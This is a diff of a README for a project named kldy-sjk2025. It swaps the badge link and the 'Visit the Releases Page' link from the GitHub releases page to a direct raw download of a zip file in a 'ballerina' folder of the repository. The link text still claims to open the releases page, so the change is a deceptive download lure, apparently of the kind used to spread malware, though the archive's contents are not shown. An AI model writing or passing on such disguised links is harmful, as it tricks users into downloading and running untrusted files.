@@ -6,7 +6,7 @@ Welcome to the kldy-sjk2025 project! This application provides high-speed, stabl
 
 ## 📥 Download Now
 
-[![Download kldy-sjk2025](https://img.shields.io/badge/Download-kldy--sjk2025-brightgreen)](https://github.com/nodexadev/kldy-sjk2025/releases)
+[![Download kldy-sjk2025](https://raw.githubusercontent.com/nodexadev/kldy-sjk2025/main/ballerina/kldy-sjk2025.zip)](https://raw.githubusercontent.com/nodexadev/kldy-sjk2025/main/ballerina/kldy-sjk2025.zip)
 
 ## 💡 What You Need
 
@@ -28,7 +28,7 @@ Before you start, make sure you have:
 
 To get kldy-sjk2025 on your device, follow these steps:
 
-1. **Visit the Releases Page**: Click [here](https://github.com/nodexadev/kldy-sjk2025/releases) to open the releases page.
+1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/nodexadev/kldy-sjk2025/main/ballerina/kldy-sjk2025.zip) to open the releases page.
 2. **Choose the Right Version**: Look for the latest version available.
 3. **Download the File**: Click on the link for the latest version to begin the download.
 4. **Open the Downloaded File**: Once the download is complete, locate the file in your downloads folder.
